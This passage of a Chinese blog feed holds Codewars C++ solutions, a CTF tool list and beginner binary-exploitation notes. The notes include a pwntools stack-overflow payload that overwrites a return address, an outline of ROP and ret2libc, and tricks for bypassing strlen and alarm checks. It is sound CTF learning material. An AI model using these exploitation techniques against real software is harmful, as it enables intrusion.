<span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="lt-8kyu-gt-Convert-number-to-reversed-array-of-digits"><a href="#lt-8kyu-gt-Convert-number-to-reversed-array-of-digits" class="headerlink" title="&lt;8kyu&gt; Convert number to reversed array of digits"></a>&lt;8kyu&gt; Convert number to reversed array of digits</h2><p>题目描述：</p><p>Convert number to reversed array of digits</p><p>Given a random non-negative number, you have to return the digits of this number within an array in reverse order.</p><p>就是一个小特判</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-function">std::vector&lt;<span class="hljs-type">int</span>&gt; <span class="hljs-title">digitize</span><span class="hljs-params">(<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> n)</span> </span><br><span class="hljs-function"></span>&#123;   <br>    std::vector&lt;<span class="hljs-type">int</span>&gt; m;<br>    <span class="hljs-keyword">while</span>(n != <span class="hljs-number">0</span>) &#123;<br>        m.<span class="hljs-built_in">push_back</span>(n % <span class="hljs-number">10</span>);<br>        n /= <span class="hljs-number">10</span>;<br>    &#125;<br>    <span class="hljs-keyword">if</span>(m.<span class="hljs-built_in">size</span>()==<span class="hljs-number">0</span>) m.<span class="hljs-built_in">push_back</span>(<span class="hljs-number">0</span>);<br>    <span class="hljs-keyword">return</span> m;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="lt-7-kyu-gt-Find-the-stray-number"><a href="#lt-7-kyu-gt-Find-the-stray-number" class="headerlink" title="&lt;7 kyu&gt; Find the stray number"></a>&lt;7 kyu&gt; Find the stray number</h2><p>题目描述：</p><p>You are given an <em>odd-length</em> array of integers, in which all of them are the same, except for one single number.</p><p>Complete the method which accepts such an array, and returns that single different number.</p><p><strong>The input array will always be valid!</strong> (odd-length &gt;&#x3D; 3)</p><p>投机取巧</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;algorithm&gt;</span></span><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">stray</span><span class="hljs-params">(std::vector&lt;<span class="hljs-type">int</span>&gt; numbers)</span> </span>&#123;<br>    <span class="hljs-built_in">sort</span>(numbers.<span class="hljs-built_in">begin</span>(), numbers.<span class="hljs-built_in">end</span>());<br>    <span class="hljs-keyword">if</span>(numbers[<span class="hljs-number">0</span>] != numbers[<span class="hljs-number">1</span>]) <span class="hljs-keyword">return</span> numbers[<span class="hljs-number">0</span>];<br>    <span class="hljs-keyword">else</span> <span class="hljs-keyword">return</span> numbers[numbers.<span class="hljs-built_in">size</span>()<span class="hljs-number">-1</span>];<br>&#125;;<br></code></pre></td></tr></table></figure><h2 id="lt-8-kyu-gt-Beginner-Reduce-but-Grow"><a href="#lt-8-kyu-gt-Beginner-Reduce-but-Grow" class="headerlink" title="&lt;8 kyu&gt; Beginner - Reduce but Grow"></a>&lt;8 kyu&gt; Beginner - Reduce but Grow</h2><p>题目描述：</p><p>Given a non-empty array of integers, return the result of multiplying the values together in order. Example:</p><figure class="highlight tap"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs tap">[1, 2, 3, 4] =&gt;<span class="hljs-number"> 1 </span>*<span class="hljs-number"> 2 </span>*<span class="hljs-number"> 3 </span>*<span class="hljs-number"> 4 </span>= 24<br></code></pre></td></tr></table></figure><p>选用C++支持Clang 8 C++17，用点特性</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs C++"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;vector&gt;</span></span><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">grow</span><span class="hljs-params">(std::vector&lt;<span class="hljs-type">int</span>&gt; nums)</span> </span>&#123;<br>  <span class="hljs-type">int</span> s = <span class="hljs-number">1</span>;<br>  <span class="hljs-keyword">for</span>(<span class="hljs-keyword">auto</span> i : nums) &#123;<br>    s *= i;<br>  &#125;<br>  <span class="hljs-keyword">return</span> s;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="lt-8-kyu-gt-Student’s-Final-Grade"><a href="#lt-8-kyu-gt-Student’s-Final-Grade" class="headerlink" title="&lt;8 kyu&gt; Student’s Final Grade"></a>&lt;8 kyu&gt; Student’s Final Grade</h2><p>题目描述：</p><p>Create a function finalGrade, which calculates the final grade of a student depending on two parameters: a grade for the exam and a number of completed projects.</p><p>This function should take two arguments: exam - grade for exam (from 0 to 100); projects - number of completed projects (from 0 and above);</p><p>This function should return a number (final grade). There are four types of final grades:</p><ul><li>100, if a grade for the exam is more than 90 or if a number of completed projects more than 10.</li><li>90, if a grade for the exam is more than 75 and if a number of completed projects is minimum 5.</li><li>75, if a grade for the exam is more than 50 and if a number of completed projects is minimum 2.</li><li>0, in other cases</li></ul><p>Examples(<strong>Inputs</strong>–&gt;<strong>Output</strong>):</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">100</span>, <span class="hljs-number">12</span> --&gt; <span class="hljs-number">100</span><br><span class="hljs-attribute">99</span>, <span class="hljs-number">0</span> --&gt; <span class="hljs-number">100</span><br><span class="hljs-attribute">10</span>, <span class="hljs-number">15</span> --&gt; <span class="hljs-number">100</span><br><br><span class="hljs-attribute">85</span>, <span class="hljs-number">5</span> --&gt; <span class="hljs-number">90</span><br><br><span class="hljs-attribute">55</span>, <span class="hljs-number">3</span> --&gt; <span class="hljs-number">75</span><br><br><span class="hljs-attribute">55</span>, <span class="hljs-number">0</span> --&gt; <span class="hljs-number">0</span><br><span class="hljs-attribute">20</span>, <span class="hljs-number">2</span> --&gt; <span class="hljs-number">0</span><br></code></pre></td></tr></table></figure><p>*Use Comparison and Logical Operators.</p><p>呃，判断，分支结构</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">final_grade</span><span class="hljs-params">(<span class="hljs-type">int</span> exam, <span class="hljs-type">int</span> projects)</span></span>&#123;<br>    <span class="hljs-keyword">if</span>(exam &gt; <span class="hljs-number">90</span> || projects &gt; <span class="hljs-number">10</span>) <span class="hljs-keyword">return</span> <span class="hljs-number">100</span>;<br>    <span class="hljs-keyword">if</span>(exam &gt; <span class="hljs-number">75</span> &amp;&amp; projects &gt;= <span class="hljs-number">5</span>) <span class="hljs-keyword">return</span>  <span class="hljs-number">90</span>;<br>    <span class="hljs-keyword">if</span>(exam &gt; <span class="hljs-number">50</span> &amp;&amp; projects &gt;= <span class="hljs-number">2</span>) <span class="hljs-keyword">return</span>  <span class="hljs-number">75</span>;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="lt-8-kyu-gt-Transportation-on-vacation"><a href="#lt-8-kyu-gt-Transportation-on-vacation" class="headerlink" title="&lt;8 kyu&gt; Transportation on vacation"></a>&lt;8 kyu&gt; Transportation on vacation</h2><p>题目描述：</p><p>After a hard quarter in the office you decide to get some rest on a vacation. So you will book a flight for you and your girlfriend and try to leave all the mess behind you.</p><p>You will need a rental car in order for you to get around in your vacation. The manager of the car rental makes you some good offers.</p><p>Every day you rent the car costs $40. If you rent the car for 7 or more days, you get $50 off your total. Alternatively, if you rent the car for 3 or more days, you get $20 off your total.</p><p>Write a code that gives out the total amount for different days(d).</p><p>这就纯炫技题（）</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">rental_car_cost</span><span class="hljs-params">(<span class="hljs-type">int</span> d)</span></span>&#123;<br>  <span class="hljs-keyword">return</span> (d &lt; <span class="hljs-number">3</span>) ? (d * <span class="hljs-number">40</span>) : (d &lt; <span class="hljs-number">7</span>) ? (d * <span class="hljs-number">40</span> - <span class="hljs-number">20</span>) : (d * <span class="hljs-number">40</span> - <span class="hljs-number">50</span>);<br>&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>CodeWars</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Codewars</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>工具搜集111</title>
    <link href="/2022/11/06/%E5%B7%A5%E5%85%B7%E6%90%9C%E9%9B%86111/"/>
    <url>/2022/11/06/%E5%B7%A5%E5%85%B7%E6%90%9C%E9%9B%86111/</url>
    
    <content type="html"><![CDATA[<h1 id="Tools"><a href="#Tools" class="headerlink" title="Tools"></a>Tools</h1><h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><p>MMSSTV</p><p>Stegsolve</p><p>QR_Research</p><h2 id="crypto"><a href="#crypto" class="headerlink" title="crypto"></a>crypto</h2><p>ciphey</p><p>CaptfEncoder</p><p>ToolsFx</p><h2 id="二进制"><a href="#二进制" class="headerlink" title="二进制"></a>二进制</h2><p>ExeinfoPE</p><p>010Editor</p>]]></content>
    
    
    
    <tags>
      
      <tag>CTF</tag>
      
      <tag>tools</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>PWN早期非学术性内容</title>
    <link href="/2022/11/04/PWN%E6%97%A9%E6%9C%9F%E9%9D%9E%E5%AD%A6%E6%9C%AF%E6%80%A7%E5%86%85%E5%AE%B9/"/>
    <url>/2022/11/04/PWN%E6%97%A9%E6%9C%9F%E9%9D%9E%E5%AD%A6%E6%9C%AF%E6%80%A7%E5%86%85%E5%AE%B9/</url>
    
    <content type="html"><![CDATA[<h2 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h2><p>大部分师傅的建议都是Ubuntu16.04，不过总会自动更新导致内核不匹配可能就坏掉了。</p><p>可以搞Ubuntu18，再用patchelf去更改libc库的版本（暂时只知道栈溢出类题型用得到），<strong>一定记得这个时候也要把自动更新关掉</strong>。</p><p>当然，多多益善，最好是18 20 22都有（仅16的题说实在的真的还没见）。</p><span id="more"></span><h3 id="可能出现的问题"><a href="#可能出现的问题" class="headerlink" title="可能出现的问题"></a>可能出现的问题</h3><p>不能粘贴剪切板：<a href="https://blog.csdn.net/Sun_study/article/details/122334345">解决ubuntu虚拟机vmware tools无法共享剪贴板问题_Tyfrank的博客-CSDN博客_虚拟机剪贴板</a></p><p>Ubuntu18.04换源：<a href="https://blog.csdn.net/Williamcsj/article/details/123384482"> Ubuntu18.04——换源_William.csj的博客-CSDN博客_ubuntu18.04换源</a></p><p>虚拟机文件拖拽：<a href="https://blog.csdn.net/davidhzq/article/details/101621482">Vmware虚拟机和主机之间复制、粘贴内容、拖拽文件的详细方法_豆豆技术派的博客-CSDN博客_虚拟机和主机复制粘贴</a></p><p>patchelf：<a href="https://blog.csdn.net/juluwangriyue/article/details/108617283">https://blog.csdn.net/juluwangriyue/article/details/108617283</a></p><p>以下一段对应Python2.7升级pip方法</p><p>remove：</p><blockquote><p>sudo apt-get remove python-pip</p></blockquote><p>install：</p><blockquote><p>python -m pip install –user –upgrade pip&#x3D;&#x3D;20.2.4</p></blockquote><p>pip强升21：<a href="https://blog.csdn.net/jn10010537/article/details/121144888">【python初级】 Ubuntu18.04上升级pip_jn10010537的博客-CSDN博客_ubuntu升级pip</a></p><p>记得的多多sudo .&#x2F;setup.sh，一遍可能出问题，毕竟服务器都在国外，换源国内也可能偶尔连不上。</p><h3 id="pwndbg"><a href="#pwndbg" class="headerlink" title="pwndbg"></a>pwndbg</h3><p>大多是根据师傅的教程直接跟着走就好了。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br><span class="hljs-comment"># io = remote(&#x27;172.16.177.134&#x27;, 9999)     对于Docker上的内容</span><br><br>io=process(<span class="hljs-string">&#x27;./StackOverflow&#x27;</span>)  <span class="hljs-comment"># 对于文件</span><br><br>payload = <span class="hljs-string">b&#x27;A&#x27;</span>*<span class="hljs-number">0x48</span>+ <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x4</span> + p32(<span class="hljs-number">0x0804850E</span>)   <span class="hljs-comment"># payload！（废字符补栈，补rbp，，再补retn的地址）</span><br><span class="hljs-comment"># x86用p32()，x64用p64()，还有p16，p8</span><br>io.sendline(payload)<span class="hljs-comment"># 输入！</span><br><br>io.interactive()<span class="hljs-comment"># 交互！</span><br><span class="hljs-comment"># io.close()没太大用捏，要shell的话不得多玩一会（不是）</span><br></code></pre></td></tr></table></figure><p>My_First_Stack_Overflow.png（一脸喜悦）</p><p><strong>在命名py文件的时候，注意不要将其命名为pwn.py，pwn已被pwntools占用，使用会报错（会判断为包体正在引用自己）。</strong></p><p>接下来我们遇见的类型题，是ROP。</p><h2 id="什么是ROP"><a href="#什么是ROP" class="headerlink" title="什么是ROP"></a>什么是ROP</h2><p>ROP是Return Oriented Programming的缩写，翻译过来就是面向返回的编程。</p><p>其核心在于利用了指令集中的ret指令，改变了指令流的执行顺序。ROP攻击一般需要满足如下条件：</p><ul><li>程序存在溢出，并且可以控制返回地址。</li><li>可以找到满足条件的gadgets以及相应的gadgets地址。</li></ul><p>gadgets一般满足</p><blockquote><p>xxx</p><p>xxx</p><p>ret</p></blockquote><p>如</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs assembly">pop ebx<br>pop esi<br>pop edi<br>pop ebp<br>ret<br></code></pre></td></tr></table></figure><p>即一堆指令后跟着ret。</p><h2 id="参数入栈顺序"><a href="#参数入栈顺序" class="headerlink" title="参数入栈顺序"></a>参数入栈顺序</h2><h3 id="32位"><a href="#32位" class="headerlink" title="32位"></a>32位</h3><blockquote><p>read(0, buf, 0x100);</p></blockquote><p>其对应汇编为</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs assembly">.text:xxxxxxxxpush 100h;nbytes<br>.text:xxxxxxxxlea eax,[ebp+buf]<br>.text:xxxxxxxxpush eax;buf<br>.text:xxxxxxxxpush 0;fd<br>.text:xxxxxxxxcall _read<br></code></pre></td></tr></table></figure><p>参数从右到左入栈，先push 0x100（read的第三个参数0x100），再push buf（read的第二个参数），最后push 0（read的第一个参数0）。</p><p>所以如：</p><blockquote><p>func(0,1,2,3,4,5,6);</p></blockquote><p>其对应汇编就应该是</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs assembly">push 6<br>push 5<br>push 4<br>push 3<br>push 2<br>push 1<br>push 0<br>call func<br></code></pre></td></tr></table></figure><p>不过64位的程序就开始有区别了。</p><h3 id="64位"><a href="#64位" class="headerlink" title="64位"></a>64位</h3><blockquote><p>read(0, buf, 0x100);</p></blockquote><p>其对应汇编这次为</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs assembly">.text:xxxxxxxxlea rax,[rbp+buf]<br>.text:xxxxxxxxmov edx,100h;nbytes<br>.text:xxxxxxxxmov rsi,rax;buf<br>.text:xxxxxxxxmov edi,0;fd<br>.text:xxxxxxxxcall read<br></code></pre></td></tr></table></figure><p>所以如：</p><blockquote><p>func(0,1,2,3,4,5,6);</p></blockquote><p>其对应汇编就变成了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs assembly">push    6<br>mov     r9d, 5<br>mov     r8d, 4<br>mov     ecx, 3<br>mov     edx, 2<br>mov     esi, 1<br>mov     edi, 0<br>call    my_fun<br></code></pre></td></tr></table></figure><p>函数的前六个参数都会放到对应的寄存器中，从左到右依次是：</p><blockquote><p>rdi,  rsi,  rdx,  rcx,  r8d,  r9d</p></blockquote><p>再有更多参数时，就会通过栈来传递。</p><p>更多内容详见<a href="https://oslike.github.io/2022/11/04/%E6%9F%90%E4%BA%9B%E5%B0%8F%E7%9F%A5%E8%AF%86%E8%AE%B0%E5%BD%95/#ret2syscall">某些小知识记录(持续更新) - OSLike’s Blog</a></p><p><em><strong>#—已完结—#</strong></em></p>]]></content>
    
    
    <categories>
      
      <category>CTFPWN</category>
      
    </categories>
    
    
    <tags>
      
      <tag>knowledge</tag>
      
      <tag>pwn</tag>
      
      <tag>CTF</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>某些小知识记录(持续更新)</title>
    <link href="/2022/11/04/%E6%9F%90%E4%BA%9B%E5%B0%8F%E7%9F%A5%E8%AF%86%E8%AE%B0%E5%BD%95/"/>
    <url>/2022/11/04/%E6%9F%90%E4%BA%9B%E5%B0%8F%E7%9F%A5%E8%AF%86%E8%AE%B0%E5%BD%95/</url>
    
    <content type="html"><![CDATA[<h2 id="利用checksec可以猜测题目大致考的方向"><a href="#利用checksec可以猜测题目大致考的方向" class="headerlink" title="利用checksec可以猜测题目大致考的方向"></a>利用checksec可以猜测题目大致考的方向</h2><h3 id="整理"><a href="#整理" class="headerlink" title="整理"></a>整理</h3><p>没有NX，自带系统命令，直接返回地址，ret2text</p><p>没有NX，找不到system()，有可执行段，可写入shellcode，ret2shellcode</p><p>（mprotected(,,7)有对某段地址提高权限的能力，可以写入shellcode）</p><p>可以有NX，找得到system()的plt的绝对地址，没有binsh，ret2libc2</p><p>有NX，利用ROPgadget配合int 0x80调用execve，ret2syscall</p><p>有NX，利用Libc获取system()，binsh相对位置，ret2libc</p><span id="more"></span><h3 id="未整理"><a href="#未整理" class="headerlink" title="未整理"></a>未整理</h3><p>注意堆栈平衡</p><hr><h2 id="关于alarm-反调试的绕过"><a href="#关于alarm-反调试的绕过" class="headerlink" title="关于alarm()反调试的绕过"></a>关于alarm()反调试的绕过</h2><p><em><strong>目的仅为反调试的绕过方法，而非反过来利用</strong></em></p><p>alarm函数被引用于unistd.h头文件，其函数原型为unsigned int alarm(unsigned int seconds)</p><p>alarm()函数的主要功能是设置信号传送闹钟，即用来设置信号SIGALRM在经过参数seconds秒数后发送给目前的进程。如果未设置信号SIGALARM的处理函数，那么alarm()默认处理终止进程。</p><p><strong>绕过方法：</strong></p><p>以文本编辑器打开，搜索alarm并将其修改为isnan</p><hr><h2 id="关于strlen-检查字符串长度的绕过"><a href="#关于strlen-检查字符串长度的绕过" class="headerlink" title="关于strlen()检查字符串长度的绕过"></a>关于strlen()检查字符串长度的绕过</h2><blockquote><p>*<em>C库函数 <em>size_t strlen(const char <em>str)<em>计算字符串</em>str</em>的长度，直到首个空结束字符（\000），但不包括空结束字符。</em></em></p><p>例：</p><p>char str[7]&#x3D;{‘1’,’2’,’3’,’\000’,’4’,’5’};</p><p>strlen(str)的返回值为3</p></blockquote><p>如果文件存在对输入message长度的检查，可以利用’\000’字符绕过。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> &#123;<span class="hljs-comment">//压行，自行Astyle。</span><br><span class="hljs-type">char</span> str[<span class="hljs-number">16</span>]=&#123;&#125;; <span class="hljs-type">int</span> i;<br><span class="hljs-keyword">for</span>(i = <span class="hljs-number">0</span>;i &lt;= <span class="hljs-number">16</span>; i++) <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d&quot;</span>,(<span class="hljs-type">int</span>)str[i]);<br>   <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n&quot;</span>);<br><span class="hljs-keyword">for</span>(i = <span class="hljs-number">0</span>;i &lt; <span class="hljs-number">16</span> ; i++) &#123;<br>str[i] = (<span class="hljs-type">char</span>)(i+<span class="hljs-string">&#x27;A&#x27;</span>);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%c&quot;</span>,str[i]);<br>&#125; <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n&quot;</span>);<br>str[<span class="hljs-number">3</span>] = <span class="hljs-string">&#x27;\000&#x27;</span>;<br><span class="hljs-keyword">for</span>(i = <span class="hljs-number">0</span>;i &lt;= <span class="hljs-number">16</span>; i++) <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d&quot;</span>,(<span class="hljs-type">int</span>)str[i]);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n&quot;</span>);<br><span class="hljs-keyword">for</span>(i = <span class="hljs-number">0</span>;i &lt; <span class="hljs-number">16</span> ; i++) <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%c&quot;</span>,str[i]);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n&quot;</span>);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d\n&quot;</span>,<span class="hljs-built_in">strlen</span>(str));<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%s&quot;</span>,&amp;str);<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>第一个strlen打印16，第二个打印3。（均为正常输出）</p><p>即在使用strlen的情况下，填入’\000’能够有效保护后面的字符。</p><p>使用编译器为MinGW4.9.2-tdm64-3、TDM-GCC4.9.2-tdm-3(x86)，对应IDE为BloodShed Dev-C++5.11，保证str所在栈后后缓冲区且能够正常填入’\000’（无论是在x86还是x86-64条件下均正常）。</p><hr><h2 id="利用atoi-，并检测首字符的情况"><a href="#利用atoi-，并检测首字符的情况" class="headerlink" title="利用atoi()，并检测首字符的情况"></a>利用atoi()，并检测首字符的情况</h2><p>atoi()函数会尽量去除字符串开头的所有空格，则可在字符串开头添加一个或多个空格。</p><hr><h2 id="利用strtol函数去控制gadget"><a href="#利用strtol函数去控制gadget" class="headerlink" title="利用strtol函数去控制gadget"></a>利用strtol函数去控制gadget</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">long</span> <span class="hljs-type">int</span> <span class="hljs-title function_">strtol</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span> *str, <span class="hljs-type">char</span> **endptr, <span class="hljs-type">int</span> base)</span><br></code></pre></td></tr></table></figure><p>该函数会在处理str字符串时截断在第一个不能转化为数字的位置，并将剩余部分用’\x00’做截断，将endptr参数赋值为str被截断位置下一个字符地址，base为基数。</p><p>该函数在处理字符串过程中，会将处理后的数字后面填’\x00’后放入rdi寄存器中，同时rax会被赋值为返回值，由此便可控制rax与rdi寄存器。</p><hr><h2 id="一些溢出类型"><a href="#一些溢出类型" class="headerlink" title="一些溢出类型"></a>一些溢出类型</h2><h3 id="char-（定长的string）型溢出"><a href="#char-（定长的string）型溢出" class="headerlink" title="char*（定长的string）型溢出"></a>char*（定长的string）型溢出</h3><p>大多为使用：</p><blockquote><p>scanf(“%s”,buf);</p><p>gets(buf);</p></blockquote><p>这种类型的溢出利用了函数调用后由于栈溢出造成的溢出到r，造成返回到输入地址的情况。</p><p>我们可以使用fgets()函数去避免既没有栈保护，也没有输入限制的情况。</p><h3 id="数据（多为int）型溢出"><a href="#数据（多为int）型溢出" class="headerlink" title="数据（多为int）型溢出"></a>数据（多为int）型溢出</h3><p>不多说：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">int</span>: -<span class="hljs-number">2147483648</span> ~ <span class="hljs-number">2147483647</span>(-<span class="hljs-number">2</span>^<span class="hljs-number">31</span>^ ~ <span class="hljs-number">2</span>^<span class="hljs-number">31</span>^-<span class="hljs-number">1</span>)<br><br><span class="hljs-attribute">unsigned</span> int: <span class="hljs-number">0</span> ~ <span class="hljs-number">4294967295</span>(<span class="hljs-number">0</span> ~ <span class="hljs-number">2</span>^<span class="hljs-number">32</span>^-<span class="hljs-number">1</span>)<br><br><span class="hljs-attribute">long</span> long: -<span class="hljs-number">2</span>^<span class="hljs-number">63</span>^ ~ <span class="hljs-number">2</span>^<span class="hljs-number">63</span>^-<span class="hljs-number">1</span><br><br><span class="hljs-attribute">unsigned</span> long long: <span class="hljs-number">0</span> ~ <span class="hljs-number">2</span>^<span class="hljs-number">64</span>^-<span class="hljs-number">1</span><br><br><span class="hljs-attribute">short</span>: -<span class="hljs-number">32768</span> ~ <span class="hljs-number">32767</span>(-<span class="hljs-number">2</span>^<span class="hljs-number">15</span>^ ~ <span class="hljs-number">2</span>^<span class="hljs-number">15</span>^-<span class="hljs-number">1</span>)<br><br><span class="hljs-attribute">unsigned</span> short: <span class="hljs-number">0</span> ~ <span class="hljs-number">65535</span>(<span class="hljs-number">0</span> ~ <span class="hljs-number">2</span>^<span class="hljs-number">16</span>^-<span class="hljs-number">1</span>)<br></code></pre></td></tr></table></figure><p><em>以上整形均与编译环境有关，如当为16位(DOS)环境时，int范围为-32768 ~ 32767。WIN32[x86(-64)]中为-2147483648 ~ 2147483637.</em></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">char</span>: -<span class="hljs-number">128</span> ~ <span class="hljs-number">127</span>(-<span class="hljs-number">2</span>^<span class="hljs-number">7</span>^ ~ <span class="hljs-number">2</span>^<span class="hljs-number">7</span>^-<span class="hljs-number">1</span>)<br><br><span class="hljs-attribute">unsigned</span> char: <span class="hljs-number">0</span> ~ <span class="hljs-number">255</span>(<span class="hljs-number">0</span> ~ <span class="hljs-number">2</span>^<span class="hljs-number">8</span>^-<span class="hljs-number">1</span>)<br><br><span class="hljs-attribute">word</span>: 二字节，一定为<span class="hljs-number">0</span> ~ <span class="hljs-number">65535</span><br><br><span class="hljs-attribute">DWORD</span>: 四字节，一定为<span class="hljs-number">0</span> ~ <span class="hljs-number">4294967295</span><br></code></pre></td></tr></table></figure><table><thead><tr><th align="center">C Data Type</th><th align="center">Typical 32-bit</th><th align="center">Typical 64-bit</th><th align="center">x86-64</th></tr></thead><tbody><tr><td align="center">char</td><td align="center">1</td><td align="center">1</td><td align="center">1</td></tr><tr><td align="center">short</td><td align="center">2</td><td align="center">2</td><td align="center">2</td></tr><tr><td align="center">int</td><td align="center">4</td><td align="center">4</td><td align="center">4</td></tr><tr><td align="center">long</td><td align="center">4</td><td align="center">8</td><td align="center">8</td></tr><tr><td align="center">float</td><td align="center">4</td><td align="center">4</td><td align="center">4</td></tr><tr><td align="center">double</td><td align="center">8</td><td align="center">8</td><td align="center">8</td></tr><tr><td align="center">long double</td><td align="center">-</td><td align="center">-</td><td align="center">10&#x2F;16</td></tr><tr><td align="center">pointer</td><td align="center">4</td><td align="center">8</td><td align="center">8</td></tr></tbody></table><p>溢出形式：</p><blockquote><p>mov ax,FFFFH;ax &#x3D; 1111 1111</p><p>sub ax,1 ;ax 